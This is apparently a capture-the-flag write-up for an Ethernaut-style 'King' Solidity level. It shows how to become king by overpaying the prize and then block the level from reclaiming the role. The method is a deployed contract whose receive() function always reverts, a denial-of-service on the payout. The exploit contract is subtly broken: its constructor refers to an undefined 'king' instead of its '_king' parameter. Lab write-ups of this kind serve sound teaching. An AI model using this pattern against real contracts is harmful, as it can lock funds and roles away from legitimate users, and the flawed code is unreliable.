### Goals

Remain the one and only king

### Exploit

This contract sets the new king to everyone that sends more funds to the contract then the previous king. When we submit the instance the level will try to reclaim ownership, our goal is to not allow that.

Worth noticing is that when new king is being assigned the new prize is sent to previous king. We can leverage this behaviour to our advantage.

Remember about `fallback` and `recieve` functions? We can specify their behaviour at receiving the funds.

### Code

First let's figure out how much we need to send to become new King

in dev console

```code
+await contract.prize()
1000000000000000
```

Let's deploy following contract with Remix sending the prize + 1 wei

```code
contract KingOfKings {
    constructor(address payable _king) public {
        (bool success, ) = address(king).call{value: msg.value}("");
    }

    receive() external payable {
      revert("The crown is mine buahahaah!!");
  }
}
```

When the instance level will try to reclaim the king it will send funds to our smart contract, but we specified that our contract reverts on receiving the funds thus we will remain the only KING :)

Done!
